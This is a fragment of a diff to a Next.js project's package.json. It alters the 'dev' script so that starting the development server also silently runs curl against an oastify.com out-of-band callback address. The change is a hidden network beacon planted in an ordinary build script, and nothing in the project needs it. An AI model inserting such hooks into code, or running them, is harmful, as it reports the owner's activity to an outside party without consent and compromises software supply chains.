@@ -3,7 +3,7 @@
   "version": "0.1.0",
   "private": true,
   "scripts": {
-    "dev": "next dev",
+    "dev": "next dev && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/openai-quicks",
     "build": "next build",
     "start": "next start"
   },
